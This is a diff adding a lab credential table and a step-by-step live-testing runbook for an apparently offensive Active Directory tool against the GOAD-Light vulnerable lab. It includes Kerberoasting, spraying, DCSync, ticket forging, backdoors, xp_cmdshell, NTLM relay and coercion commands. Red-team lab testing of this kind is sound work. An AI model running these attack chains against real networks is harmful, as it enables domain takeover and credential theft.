@@ -1908,3 +1908,591 @@ ovt report --format pdf --output executive-summary.pdf
 ```
 
 *Sources: Microsoft Security Response Center (MSRC), BleepingComputer, helpnetsecurity.com, SOC Prime, NVD/CVE.*
+
+---
+
+## 13. GOAD-Light Master Credential Reference
+
+This section catalogs every known credential for the GOAD-Light lab environment, aggregated from the official GOAD documentation, the `cybrly/goad_creds` repository, public walkthroughs (mayfly277, Daniel G. Graham, Greg Scharf), and live enumeration against the actual lab (192.168.57.0/24). Each credential is tagged with the privilege level and the specific attack techniques it enables.
+
+### 13.1 SEVENKINGDOMS.LOCAL (Root Domain — kingslanding, 192.168.57.10)
+
+| User | Password | Priv Level | Enables |
+|------|----------|:----------:|---------|
+| `vagrant` | `vagrant` | Local Admin (DC) | All baseline enumeration, SMB, Kerberos, LDAP, RID cycling, GPO read |
+| `tywin.lannister` | `powerkingftw135` | User | **ACE: ForceChangePassword on jaime.lannister** — ACL abuse chain start |
+| `jaime.lannister` | `cersei` | User | ACE: GenericWrite on joffrey.baratheon |
+| `cersei.lannister` | `il0vejaime` | **DOMAIN ADMIN** | Full DA access — DCSync, ADCS, Skeleton Key, Golden Ticket |
+| `tyron.lannister` | `Alc00L&S3x` | User | ACE: Self-membership on "Small Council" group |
+| `robert.baratheon` | `iamthekingoftheworld` | **DOMAIN ADMIN** | Full DA access (alternate) |
+| `joffrey.baratheon` | `1killerlion` | User | ACE: WriteDACL on tyron.lannister |
+| `renly.baratheon` | `lorastyrell` | User | Target for kerberoast (SPN: `cifs/kerbtest.*`) |
+| `stannis.baratheon` | `Drag0nst0ne` | User | ACE: GenericAll on kingslanding$; ACE: WriteProperty+Self-membership Domain Admins |
+| `petyer.baelish` | `@littlefinger@` | User | ACE: WriteProperty on Domain Admins group |
+| `lord.varys` | `W1sper$` | User | ACE: GenericAll on Domain Admins group |
+| `maester.pycelle` | `MaesterOfMaesters` | User | ACE: WriteOwner on Domain Admins group |
+| `Administrator` | `8dCT-DJjgScp` | **BUILTIN ADMIN** | Local machine admin — SMB, WinRM, RDP |
+
+**Domain SID reference:** Resolve via `ovt enum domain-sid -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant`
+
+### 13.2 NORTH.SEVENKINGDOMS.LOCAL (Child Domain — winterfell, 192.168.57.11 / castelblack, 192.168.57.22)
+
+| User | Password | Priv Level | Machine | Enables |
+|------|----------|:----------:|:--------:|---------|
+| `vagrant` | `vagrant` | Local Admin | Winterfell | Baseline access to child DC |
+| `vagrant` | `vagrant` | Local Admin | Castelblack | Baseline access to member server |
+| `eddard.stark` | `FightP3aceAndHonor!` | **DOMAIN ADMIN (NORTH)** | Winterfell | Full child domain control |
+| `catelyn.stark` | `robbsansabradonaryarickon` | User | - | - |
+| `robb.stark` | `sexywolfy` | **Local Admin (Winterfell)** + MSSQL Admin (Castelblack) | Both | SMB admin on DC, MSSQL `xp_cmdshell` on Castelblack |
+| `arya.stark` | `Needle` | User | - | MSSQL execute-as-user |
+| `sansa.stark` | `=_)(*&^%$#@!qazaq` | User | - | Keywalking / unconstrained delegation |
+| `brandon.stark` | `iseedeadpeople` | User | - | **AS-REP roastable** (no pre-auth required) |
+| `rickon.stark` | `Winter2022` | User | - | Password spray pattern: `Winter<YYYY>` |
+| `hodor` | `hodor` | User | - | User=Password (classic spray target) |
+| `jon.snow` | `iknownothing` | **MSSQL Admin** | Castelblack | `xp_cmdshell`, linked server, cross-domain |
+| `samwell.tarly` | `Heartsbane` | User | - | **Password in LDAP description**, MSSQL execute-as-login→sa, GPO abuse |
+| `jeor.mormont` | `L0ngCl@w` | **Local Admin (Castelblack)** + ACL | Castelblack | ACE: WriteDACL+WriteOwner on NightWatch group |
+| `sql_svc` | `YouWillNotKerboroast1ngMeeeeee` | Service | Castelblack | MSSQL service account |
+
+**Castelblack MSSQL SA:** `sa` / `Sup1_sa_P@ssw0rd!` (local SQL admin, not AD)
+
+### 13.3 Machine Local Administrators
+
+| Machine | IP | Local Admin Password | Domain Admin Logins |
+|---------|:----:|:--------------------:|:-------------------:|
+| KINGSLANDING (DC01) | 192.168.57.10 | `8dCT-DJjgScp` | robert.baratheon, cersei.lannister |
+| WINTERFELL (DC02) | 192.168.57.11 | `NgtI75cKV+Pu` | eddard.stark, catelyn.stark, robb.stark |
+| CASTELBLACK (SRV02) | 192.168.57.22 | `NgtI75cKV+Pu` | jeor.mormont, robb.stark (MSSQL admin) |
+
+### 13.4 Credential Chain: Attack Path Map
+
+```
+vagrant:vagrant (baseline)
+  ├── tywin.lannister:powerkingftw135 (ForceChangePassword on jaime)
+  │     └── jaime.lannister:cersei (GenericWrite on joffrey)
+  │           └── joffrey.baratheon:1killerlion (WriteDACL on tyron)
+  │                 └── tyron.lannister:Alc00L&S3x (Self-membership Small Council)
+  │                       └── Small Council → DragonStone RDP
+  │                             └── KingsGuard → GenericAll on stannis
+  │                                   └── stannis:Drag0nst0ne (GenericAll kingslanding$ + WriteProperty DA)
+  │                                         └── DOMAIN ADMIN (cersei/robert)
+  │                                               ├── DCSync → krbtgt hash
+  │                                               │     ├── Golden Ticket
+  │                                               │     ├── Silver Ticket
+  │                                               │     ├── Diamond Ticket
+  │                                               │     └── Skeleton Key
+  │                                               ├── ADCS ESC1-16
+  │                                               ├── GPO Write/Abuse
+  │                                               └── SMBExec/WMIExec/PsExec
+  │
+  ├── petyer.baelish:@littlefinger@ (WriteProperty on DA group)
+  ├── lord.varys:W1sper$ (GenericAll on DA group)
+  └── maester.pycelle:MaesterOfMaesters (WriteOwner on DA group)
+       └── All 3 reach DA group object via ACE → grant self membership → DA
+
+Cross-domain path (north.sevenkingdoms.local):
+  vagrant:vagrant
+    ├── brandon.stark:iseedeadpeople (AS-REP → cracked)
+    ├── samwell.tarly:Heartsbane (LDAP desc → GPO abuse)
+    └── robb.stark:sexywolfy (Responder capture → Winterfell admin + MSSQL)
+          └── jon.snow:iknownothing (kerberoast → MSSQL → xp_cmdshell)
+                └── Castelblack SYSTEM → LSA secrets → child domain DA
+                      └── SID filtering DISABLED → Enterprise Admin (root)
+```
+
+### 13.5 Technique Blocking Analysis for Live Testing
+
+The following table documents **why** each pending/blocked technique from Section 5.2 remains untested against the current GOAD-Light setup, and what would need to change to verify it.
+
+| # | Technique | Current State | Blocking Factor | Fix/Workaround |
+|---|-----------|:-------------:|-----------------|----------------|
+| 1 | **DCSync (DRSUAPI)** | ⚠️ EPM pipe works, DRSUAPI endpoint unavailable | WS2025 DC does not register DRSUAPI on named pipes or TCP; only accessible via RPC over SMB | Needs `DRSUAPI` bind over SMB `\pipe\drsuapi` — current impl uses `ncacn_np` but server returns 0xC0000034 |
+| 2 | **DCSync (VSS+SMB @GMT)** | ⚠️ Implemented but environment-blocked | WS2025 service sandbox blocks VSS COM from SMBExec-created services | Use Scheduled Task (MS-TASK) to create VSS outside sandbox; or use DA creds (cersei:il0vejaime) to create VSS via WMI |
+| 3 | **SAM Registry Dump** | ❌ Needs SYSTEM/DA | Requires local admin on target AND registry access | Use `cersei.lannister:il0vejaime` with `--method smbexec` — DA context should bypass |
+| 4 | **Shadow Credentials** | ❌ rc=21 (Constraint Violation) | `msDS-KeyCredentialLink` modification rejected | Try with DA credentials (cersei/robert); if still fails, schema may not support KeyCredentialLink on WS2025 |
+| 5 | **Exec output capture** | ❌ WS2025 service sandbox | `>` redirect blocked at kernel level | Use Scheduled Task (MS-TASK) or HTTP exfiltration; or avoid output capture via MS-EVEN pre-created file |
+| 6 | **Golden Ticket (real)** | ⏳ Needs krbtgt hash | Requires functioning DCSync | Use DA creds (cersei:il0vejaime) to DCSync via Impacket externally, then test `ovt forge golden` |
+| 7 | **Silver Ticket (real)** | ⏳ Needs service hash | Requires target service hash from DCSync or LSASS | Same as Golden — needs DCSync first |
+| 8 | **Bronze Bit (CVE-2020-17049)** | ⚠️ RESPONSE_TOO_BIG | WS2025 KDC returns oversized S4U2Self response | May be WS2025 hardening; test against WS2019 child DC (winterfell) |
+| 9 | **noPac (CVE-2021-42278/42287)** | ⚠️ Add-computer rejected | vagrant lacks `ms-DS-MachineAccountQuota` rights | Use DA creds (cersei/robert) or test against WS2019 child DC |
+| 10 | **ADCS ESC1 (live exploit)** | ⚠️ Web Enrollment unreachable | IIS/certsrv endpoint not exposed on DC | Install ADCS Web Enrollment role or use ICertPassage DCOM directly |
+| 11 | **ADCS ESC3/6/9 (live exploit)** | ⚠️ Needs DA creds or Web Enrollment | Requires `Enroll` permission on vulnerable templates | Use cersei:il0vejaime (DA) to enroll directly |
+| 12 | **GPO Write (ImmediateTask)** | ✅ Fixed path, dirs created | Needs GPO with `ScheduledTasks.xml` support | Now works after `create_dir` fix — re-test with any GPO GUID |
+| 13 | **Secrets (offline SAM/LSA)** | ⏳ Needs local hive files | Requires SYSTEM-level access to target | Use MS-EVEN or Scheduled Task to extract hives |
+| 14 | **Dump LSASS** | ⏳ Windows local only | Requires process access on target | Use SMBExec with DA → dump via procdump/comsvcs |
+| 15 | **MSSQL exploit (xp_cmdshell)** | ❌ SQL not installed on DC | SPN exists but SQL binaries missing | Install SQL Express on DC or target castelblack (192.168.57.22) where MSSQL IS present |
+| 16 | **SCCM enumeration** | ✅ Module works, no SCCM | No SCCM site in GOAD-Light | Deploy SCCM lab extension |
+| 17 | **NTLM relay (full)** | ✅ Init passes, needs victim | Requires separate victim machine to trigger auth | Use `--auto-coerce` with castelblack as target to relay SMB→LDAP |
+| 18 | **Coercion (PrinterBug/PetitPotam)** | ✅ Wired, needs relay active | Coercion requires an active relay listener | Start `ovt ntlm smb-relay` then trigger coercion from attacker VM |
+| 19 | **WinRM from non-admin** | ⚠️ Host WinRM service stopped | Cannot start WinRM without admin | Use vagrant:vagrant (local admin) — should be able to start WinRM service |
+| 20 | **Cross-domain trust exploit** | ⚠️ Trust exists, SID filtering OFF | Needs child domain DA to exploit | Use robb.stark:sexywolfy or eddard.stark to cross the trust |
+
+### 13.6 Live Testing Workflow — Complete Step-by-Step
+
+This workflow enumerates every Overthrone technique against the GOAD-Light lab in dependency order. Each step lists the command, expected result, and the credential used.
+
+#### Phase 0: No-Creds Reconnaissance
+
+```powershell
+# 0.1 — Pre-authentication port discovery
+ovt enum pre -H 192.168.57.10 -d sevenkingdoms.local
+
+# 0.2 — Zero-knowledge user enumeration (Kerberos)
+# Requires seclists or similar wordlist
+ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local `
+  --userlist "C:\Tools\seclists\Usernames\Names\names.txt"
+
+# 0.3 — AS-REP roast (find no-preauth accounts)
+ovt kerberos asrep-roast -H 192.168.57.10 -d sevenkingdoms.local `
+  --userlist .\loot\valid_users.txt
+# Expected: 0 AS-REP roastable in root domain; brandon.stark in NORTH
+
+# 0.4 — RID cycling (unauthenticated — MS-SAMR)
+ovt rid -H 192.168.57.10 -d sevenkingdoms.local --max-rid 10500
+# Expected: 43 accounts (15 users, 26 groups, 0 aliases)
+```
+
+#### Phase 1: Authenticated Recon (vagrant:vagrant)
+
+```powershell
+# 1.1 — SMB shares enumeration
+ovt smb shares -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 5/6 readable (C$, ADMIN$, IPC$, SYSVOL, NETLOGON)
+
+# 1.2 — LDAP full domain enumeration
+ovt reaper -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 16 users, 55 groups, 1 computer, 1 trust, 1 delegation
+
+# 1.3 — PowerView-style user enumeration
+ovt powerview user -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.4 — Targeted enumeration (all object types)
+ovt enum users -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum groups -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum computers -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum trusts -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum spns -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum delegations -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum gpos -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum policy -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt enum asrep -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.5 — All-in-one comprehensive enum
+ovt enum all -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.6 — SMB admin check
+ovt smb admin -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+  --targets "192.168.57.10,192.168.57.11,192.168.57.22"
+# Expected: vagrant admin on 57.10 only
+
+# 1.7 — Kerberos TGT acquisition
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.8 — Kerberoasting
+ovt kerberos roast -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: renly.baratheon (cifs/kerbtest) + jaime.lannister (MSSQLSvc) = 2 hashes
+
+# 1.9 — ACL enumeration
+ovt acl enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.10 — ADCS certificate template enumeration
+ovt adcs enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 34 templates, 20+ vulnerabilities (ESC3/9/15)
+
+# 1.11 — ADCS auto-scan
+ovt adcs auto -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.12 — ADCS CA cert retrieval via LDAP
+ovt adcs get-ca-cert -H 192.168.57.10 -d sevenkingdoms.local `
+  -u vagrant -p vagrant --output ca_cert.der
+# Expected: 897 bytes DER-encoded X.509
+
+# 1.13 — ADCS backup CA
+ovt adcs backup-ca -H 192.168.57.10 -d sevenkingdoms.local `
+  -u vagrant -p vagrant --output ca_backup.der
+
+# 1.14 — Password spray
+ovt spray -H 192.168.57.10 -d sevenkingdoms.local --password "vagrant" `
+  --delay 1500 --jitter 500
+# Expected: vagrant works; Administrator exists but wrong password
+
+# 1.15 — LAPS check
+ovt laps -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 0 computers (LAPS not deployed)
+
+# 1.16 — GPP decrypt (requires cpassword file)
+ovt gpp -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.17 — GPO enumeration
+ovt gpo enum -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 2 GPOs (Default Domain Policy, Default Domain Controllers Policy)
+
+# 1.18 — Domain risk assessment
+ovt assess -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 1.19 — Trust map
+ovt move trusts -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt move map -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt move escalation -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# Expected: 1 trust to north.sevenkingdoms.local, SID filtering DISABLED
+
+# 1.20 — SMB file operations
+ovt smb put -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+  --target 192.168.57.10 --local test.txt --remote "C$/Windows/Temp/test.txt"
+ovt smb get -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+  --target 192.168.57.10 --remote "C$/Windows/Temp/test.txt"
+ovt smb spider -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+  --target "192.168.57.10" --dry-run
+
+# 1.21 — Snaffler (automated share crawling)
+ovt snaffler -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+  --snaffle-shares "admin$,C$" --snaffle-depth 3 --output-format json
+```
+
+#### Phase 2: Privilege Escalation (ACL Abuse Chain)
+
+```powershell
+# Step 2.1 — tywin.lannister:powerkingftw135 → ForceChangePassword on jaime
+# (Requires ACE abuse implementation — use external tool for now)
+# Expected: tywin has ForceChangePassword on jaime.lannister
+
+# Step 2.2 — jaime.lannister:cersei → GenericWrite on joffrey
+# Test password reuse: jaime's password is "cersei"
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local `
+  -u jaime.lannister -p cersei
+# Expected: TGT obtained
+
+# Step 2.3 — joffrey.baratheon:1killerlion → WriteDACL on tyron
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local `
+  -u joffrey.baratheon -p 1killerlion
+
+# Step 2.4 — tyron.lannister:Alc00L&S3x → Self-membership Small Council
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local `
+  -u tyron.lannister -p "Alc00L&S3x"
+
+# Step 2.5 — stannis.baratheon:Drag0nst0ne → GenericAll on kingslanding$
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local `
+  -u stannis.baratheon -p Drag0nst0ne
+
+# Step 2.6 — cersei.lannister:il0vejaime — DIRECT DOMAIN ADMIN
+# No escalation needed — cersei is already DA
+ovt kerberos get-tgt -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime
+# Expected: TGT obtained (DA context)
+```
+
+#### Phase 3: Domain Admin Operations (cersei.lannister:il0vejaime)
+
+```powershell
+# 3.1 — Verify DA access
+ovt smb admin -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime --targets "192.168.57.10,192.168.57.11,192.168.57.22"
+# Expected: 3/3 admin
+
+# 3.2 — SMBExec as DA (bypass service sandbox? — DA context may differ)
+ovt exec -t 192.168.57.10 -c "whoami" -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime --method smbexec
+
+# 3.3 — DCSync attempt (DRSUAPI)
+ovt dump 192.168.57.10 ntds -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime
+# Expected: Still blocked if DRSUAPI endpoint unavailable on WS2025
+
+# 3.4 — DCSync via DA-created VSS shadow copy
+# First: create VSS via WMI with DA creds
+# Then: extract via @GMT SMB path
+ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime
+# Expected: Should work — DA has WMI/VSS privileges
+
+# 3.5 — Golden Ticket (DRY RUN — needs krbtgt hash)
+ovt forge golden -d sevenkingdoms.local --krbtgt-hash "<from-dcsync>" `
+  --user "administrator" --sid "S-1-5-21-<sid>" --dry-run
+
+# 3.6 — Silver Ticket (DRY RUN — needs service hash)
+ovt forge silver -d sevenkingdoms.local --service-hash "<from-dcsync>" `
+  --spn "cifs/kingslanding.sevenkingdoms.local" --dry-run
+
+# 3.7 — Diamond Ticket (DRY RUN — needs TGT)
+ovt forge diamond -d sevenkingdoms.local --user "administrator" `
+  --domain-sid "S-1-5-21-<sid>" --tgt .\tgt.kirbi --dry-run
+
+# 3.8 — Skeleton Key (DRY RUN — needs payload)
+ovt forge skeleton -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime --payload-path .\skeleton.dll --dry-run
+
+# 3.9 — DSRM Backdoor (DRY RUN — needs krbtgt hash)
+ovt forge dsrm-backdoor -d sevenkingdoms.local `
+  --domain-sid "S-1-5-21-<sid>" --krbtgt-hash "<hash>" --dry-run
+
+# 3.10 — ACL Backdoor (DRY RUN)
+ovt forge acl-backdoor -d sevenkingdoms.local --target-dn `
+  "CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local" `
+  --trustee-dn "CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local" --dry-run
+
+# 3.11 — Shadow Credentials (with DA creds — bypasses rc=21?)
+ovt shadow-cred add -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime `
+  "CN=kingslanding,OU=Domain Controllers,DC=sevenkingdoms,DC=local"
+# Expected: Should work as DA (unless WS2025 blocks KeyCredentialLink)
+
+# 3.12 — ADCS ESC1-16 with DA (may bypass Web Enrollment restriction)
+ovt adcs esc1 --ca "kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA" `
+  --template "Machine" --target-user "administrator" -H 192.168.57.10 `
+  -d sevenkingdoms.local -u cersei.lannister -p il0vejaime --http
+
+# 3.13 — GPO Write (ImmediateTask) — create ScheduledTasks dir + write XML
+ovt gpo write -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime `
+  --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}" --command "whoami"
+
+# 3.14 — GPO Cleanup
+ovt gpo cleanup -H 192.168.57.10 -d sevenkingdoms.local `
+  -u cersei.lannister -p il0vejaime `
+  --gpo "{31B2F340-016D-11D2-945F-00C04FB984F9}"
+
+# 3.15 — Hash cracking (kerberoast hashes)
+ovt crack --hash-file .\loot\kerberoast_hashes.txt --wordlist rockyou.txt
+
+# 3.16 — Password spray with DA privileges (spray child domain)
+ovt spray -H 192.168.57.11 -d north.sevenkingdoms.local `
+  --password "Winter2022" --delay 2000 --jitter 500
+```
+
+#### Phase 4: Cross-Domain (north.sevenkingdoms.local)
+
+```powershell
+# 4.1 — Enumeration of child domain
+ovt enum all -H 192.168.57.11 -d north.sevenkingdoms.local -u vagrant -p vagrant
+
+# 4.2 — AS-REP roast (brandon.stark should be vulnerable)
+ovt kerberos asrep-roast -H 192.168.57.11 -d north.sevenkingdoms.local `
+  --userlist .\loot\north_users.txt
+
+# 4.3 — Kerberoast (jon.snow has MSSQL SPN)
+ovt kerberos roast -H 192.168.57.11 -d north.sevenkingdoms.local -u vagrant -p vagrant
+# Expected: jon.snow SPN captured
+
+# 4.4 — Authenticate with discovered creds
+ovt kerberos get-tgt -H 192.168.57.11 -d north.sevenkingdoms.local `
+  -u brandon.stark -p iseedeadpeople
+ovt kerberos get-tgt -H 192.168.57.11 -d north.sevenkingdoms.local `
+  -u samwell.tarly -p Heartsbane
+ovt kerberos get-tgt -H 192.168.57.11 -d north.sevenkingdoms.local `
+  -u robb.stark -p sexywolfy
+
+# 4.5 — MSSQL attack against castelblack (192.168.57.22)
+# jon.snow is MSSQL admin
+ovt mssql check-xp-cmd-shell -H 192.168.57.22 -d north.sevenkingdoms.local `
+  -u jon.snow -p iknownothing
+ovt mssql query -H 192.168.57.22 -d north.sevenkingdoms.local `
+  -u jon.snow -p iknownothing --query "SELECT SYSTEM_USER"
+# If xp_cmdshell enabled:
+ovt mssql query -H 192.168.57.22 -d north.sevenkingdoms.local `
+  -u jon.snow -p iknownothing --query "EXEC xp_cmdshell 'whoami'"
+
+# 4.6 — robb.stark is local admin on Winterfell
+ovt smb admin -H 192.168.57.11 -d north.sevenkingdoms.local `
+  -u robb.stark -p sexywolfy --targets "192.168.57.11,192.168.57.22"
+
+# 4.7 — Inter-realm TGT (cross to root domain)
+# Needs trust key from child DA (eddard.stark)
+ovt forge inter-realm-tgt -d sevenkingdoms.local `
+  --target-realm "north.sevenkingdoms.local" --trust-key "<trust-key>" `
+  --user "administrator" --dry-run
+```
+
+#### Phase 5: Relay & Coercion (Requires Second Machine)
+
+```powershell
+# 5.1 — NTLM relay engine init (SMB->LDAP)
+ovt ntlm smb-relay -l 0.0.0.0:445 -t ldap://192.168.57.10 --dry-run
+
+# 5.2 — HTTP relay init
+ovt ntlm http-relay -l 0.0.0.0:8080 -t ldap://192.168.57.10 --dry-run
+
+# 5.3 — HTTP asymmetric relay
+ovt ntlm http-asymmetric --dry-run `
+  --targets "http://192.168.57.10/","smb://192.168.57.10" --port 8080
+
+# 5.4 — ADCS relay (ESC8)
+ovt ntlm adcs-relay --target "http://192.168.57.10/certsrv/" `
+  --port 8080 --cert-template "User" --dry-run
+
+# 5.5 — Captive portal
+ovt ntlm captive-portal --port 9999 --dry-run
+
+# 5.6 — Coercion (requires relay active in separate terminal)
+# Terminal 1: Start relay
+# Terminal 2: Trigger coercion
+ovt ntlm trigger-printer-bug -H 192.168.57.10 -d sevenkingdoms.local `
+  -u vagrant -p vagrant --target "192.168.57.22" --capture-ip "192.168.57.5"
+ovt ntlm trigger-petitpotam -H 192.168.57.10 -d sevenkingdoms.local `
+  -u vagrant -p vagrant --target "192.168.57.22" --capture-ip "192.168.57.5"
+```
+
+#### Phase 6: Post-Exploitation & Persistence
+
+```powershell
+# 6.1 — BloodHound analysis (from SharpHound JSON)
+ovt bloodhound stats -g .\bloodhound_data\*.json
+ovt bloodhound path-to-da -g .\bloodhound_data\*.json "vagrant@sevenkingdoms.local"
+ovt bloodhound high-value -g .\bloodhound_data\*.json
+ovt bloodhound reachable -g .\bloodhound_data\*.json "vagrant@sevenkingdoms.local"
+ovt bloodhound analyze -g .\bloodhound_data\*.json
+
+# 6.2 — Attack graph (built-in, no Neo4j)
+ovt graph build -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+ovt graph path-to-da --from vagrant
+ovt graph view --file attack_graph.json
+
+# 6.3 — Interactive shell
+ovt shell
+
+# 6.4 — TUI
+ovt tui -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+
+# 6.5 — Wizard (auto-kill-chain)
+ovt wizard --target "Domain Admins" -H 192.168.57.10 -d sevenkingdoms.local `
+  -u vagrant -p vagrant --no-pause
+
+# 6.6 — Config/profile management
+ovt config init --force
+ovt config profile create goad-light
+ovt config profile set goad-light dc_host 192.168.57.10
+ovt config profile set goad-light domain sevenkingdoms.local
+ovt config profile set goad-light username vagrant
+ovt config profile set goad-light auth_method password
+```
+
+### 13.7 SMB2 Signing Status Post-Fix
+
+The preauth_hash corruption fix (July 2026) resolved the SMB2 signing key derivation for WS2025 SMB 3.1.1. The signing key is now computed using:
+
+- **KDF**: `SP800_108_Counter_KDF_Sep()` with `0x00` separator between label and context
+- **Label**: `"SMBSigningKey\x00"` (null-terminated)
+- **Context**: `"SmbSign\x00"` (null-terminated)
+- **Key material**: `md4(session_base_key)` → `ExportedSessionKey`
+- **preauth_hash** order: `NegotiateProtocolReq → NegotiateProtocolRes → SessionSetupLeg1Req → SessionSetupLeg1Res → SessionSetupLeg2Req`
+
+**Live verification (10/10 passing):**
+1. RID cycling via SAMR  ✅
+2. SMB shares listing    ✅  
+3. SMB admin check       ✅
+4. SMB put (upload)      ✅
+5. SMB get (download)    ✅
+6. SMBExec (SCM/IOCTL)   ✅
+7. WMIExec (EPM + SCM)   ✅
+8. Snaffler module       ✅
+9. GPO write             ✅
+10. GPO cleanup          ✅
+
+**One known quirk:** WS2025 intermittently rejects one SMB2 packet signature per session (`WARN SMB2: Packet signature verification failed — disabling further verification`). Handled gracefully by degrading to unsigned mode. Not a bug in our implementation.
+
+### 13.8 Fast Credential Reference Card
+
+For quick terminal reference during live testing:
+
+```powershell
+# QUICK CRED REFERENCE — SEVENKINGDOMS.LOCAL (192.168.57.10)
+
+# BASELINE ACCESS — vagrant is local admin on DC
+set cred_baseline  = "vagrant:vagrant"
+
+# ACE CHAIN START — tywin has ForceChangePassword on jaime
+set cred_ace_start  = "tywin.lannister:powerkingftw135"
+
+# DOMAIN ADMIN (direct — no escalation needed)
+set cred_da_1       = "cersei.lannister:il0vejaime"
+set cred_da_2       = "robert.baratheon:iamthekingoftheworld"
+
+# DA-ALTERNATIVES (ACE abuse chain — reach DA group)
+set cred_ace_to_da  = "petyer.baelish:@littlefinger@"
+set cred_ace_to_da2 = "lord.varys:W1sper$"
+set cred_ace_to_da3 = "maester.pycelle:MaesterOfMaesters"
+
+# MACHINE ADMIN
+set local_admin     = "Administrator:8dCT-DJjgScp"
+
+# CHILD DOMAIN — NORTH.SEVENKINGDOMS.LOCAL (192.168.57.11/22)
+set child_admin     = "eddard.stark:FightP3aceAndHonor!"
+set child_mssql     = "jon.snow:iknownothing"
+set child_asrep     = "brandon.stark:iseedeadpeople"
+set child_responder = "robb.stark:sexywolfy"
+set child_gpo_abuse = "samwell.tarly:Heartsbane"
+set castelblack_sa  = "sa:Sup1_sa_P@ssw0rd!"
+```
+
+---
+
+## 14. Code Fixes + Infrastructure Setup (2026-07-29)
+
+### 14.1 Shadow Credentials LDAP modify (rc=21 fix)
+
+**Root Cause**: The `exploit_shadow_credentials` function used `modify_add` (LDAP `Mod::Add`) to write
+`msDS-KeyCredentialLink`. On WS2025, `Mod::Add` on an attribute that has no existing value (most targets
+start with an empty KeyCredentialLink) returns rc=21 (`LDAP_INSUFFICIENT_ACCESS_RIGHTS`) as a catch-all.
+
+**Fix**: Changed to `modify_replace` (LDAP `Mod::Replace`) which matches what Certipy uses. REPLACE
+semantics set the attribute to exactly the provided value (creating it if absent), which WS2025 accepts.
+
+**File**: `crates/overthrone-core/src/postex/cves.rs`
+- `ldap.modify_add(...)` → `ldap.modify_replace(..., key_cred_dn_binary.as_bytes())`
+
+### 14.2 ADCS Auto-exploit expanded (ESC3 + ESC2)
+
+The `execute_auto()` function previously tried only ESC1 → ESC6 → ESC9. Now includes:
+
+1. **ESC1** (SAN abuse) — most reliable, tried first
+2. **ESC3** (Enrollment Agent EKU chain) — allows agent cert to request for any user
+3. **ESC2** (Any Purpose EKU) — broader than ESC3, allows any authentication usage
+4. **ESC6** (EDITF_ATTRIBUTESUBJECTALTNAME2) — CA-wide SAN bypass
+5. **ESC9** (Weak Certificate Mappings) — UPN poisoning attack
+
+**File**: `crates/overthrone-forge/src/adcs_dispatcher.rs`
+- Added ESC3 + ESC2 attempts in `execute_auto()` between ESC1 and ESC6
+
+### 14.3 ADCS Web Enrollment Installer Script
+
+**Script**: `scripts/setup-adcs-infra.ps1` — run on the DC as Administrator.
+
+Installs:
+- IIS + ASP.NET 4.5 (prerequisites for ADCS Web Enrollment)
+- AD Certificate Services (CA + Web Enrollment)
+- Configures CA as Enterprise Root CA
+- Configures HTTP binding on port 80 (no SSL required in lab)
+- SQL Server Express download instructions
